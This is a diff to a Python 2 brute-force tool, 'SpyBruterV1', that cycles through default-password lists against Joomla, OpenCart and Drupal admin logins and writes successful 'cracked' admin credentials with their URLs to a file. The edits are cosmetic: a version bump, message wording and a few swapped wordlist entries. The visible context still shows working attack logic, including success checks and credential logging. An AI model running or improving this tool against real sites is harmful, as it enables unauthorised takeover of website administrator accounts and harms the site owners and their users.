@@ -42,7 +42,7 @@ class SpyBruterV1:
   ____) | |_) | |_| | |_) | |  | |_| | ||  __/ |   
  |_____/| .__/ \__, |____/|_|   \__,_|\__\___|_|   
         | |     __/ |                              
-        |_|    |___/                 v1              
+        |_|    |___/                 v10              
                     
     """
             for N, line in enumerate(x.split("\n")):
@@ -81,7 +81,7 @@ class SpyBruterV1:
 
 
             else:
-                print '[-] Cms Not Found -->' + url + '\n'
+                print '[-] CMS Not Found -->' + url + '\n'
 
         except:
             print
@@ -123,7 +123,7 @@ class SpyBruterV1:
 
                         if 'New Article' in jo_check.content:
                             print lasfar + '-----------------------------------------Joomla-----------------------------------------' + labyadh + '\n'
-                            print la5dhar + '[+] Cracked Success Joomla --> ' + url + '|' + admin + '|' + pwdjoxz + labyadh + '\n'
+                            print la5dhar + '[+] Cracked  Success Joomla --> ' + url + '|' + admin + '|' + pwdjoxz + labyadh + '\n'
                             print lasfar + '------------------------------------------------------------------------------------------' + labyadh + '\n'
                             open('Cracked.txt', 'a').write(
                                 url + '/administrator/index.php ' + '|' + admin + '|' + pwdjoxz + ' [#]Joomla \n')
@@ -143,7 +143,7 @@ class SpyBruterV1:
     def opencart(self,url):
         try:
             cr = open('Cracked.txt', 'a')
-            passlist = ["123", "1", "admin", "123456", "pass", "password", "admin123", "12345", "admin@123", "123", "test",
+            passlist = ["1213", "1", "admin", "123456", "pass", "password", "admin123", "12345", "admin@123", "123", "test",
                         "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                         "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234",
                         "logitech",
@@ -187,7 +187,7 @@ class SpyBruterV1:
             user = "admin"
             passlist = ["123", "uT3ygfF44Cdlp4TFyq", "admin", "123456", "pass", "password", "admin123", "12345",
                         "admin@123", "123", "test",
-                        "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
+                        "123456789", "12334", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                         "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234", "1q2w3e4r", "xxx", "pass@123"]
             for password in passlist:
                 password = password.strip()
@@ -216,7 +216,7 @@ class SpyBruterV1:
     def Drupal(self,url):
         passlist = ["123", "uT3ygfF44Cdlp4TFyq", "admin", "123456", "pass", "password", "admin123", "12345", "admin@123",
                     "123", "test",
-                    "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
+                    "123456789", "11111", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                     "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234"]
 
         Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
@@ -265,7 +265,7 @@ class SpyBruterV1:
                     print lasfar + '--------------------------------------------------------------------------------------------' + labyadh + '\n'
 
                 else:
-                    print '[-] Failed  Drupal --> ' + url + '|admin|' + password + labyadh + '\n'
+                    print '[-] Failed  Drupal! --> ' + url + '|admin|' + password + labyadh + '\n'
 
             except:
                 pass
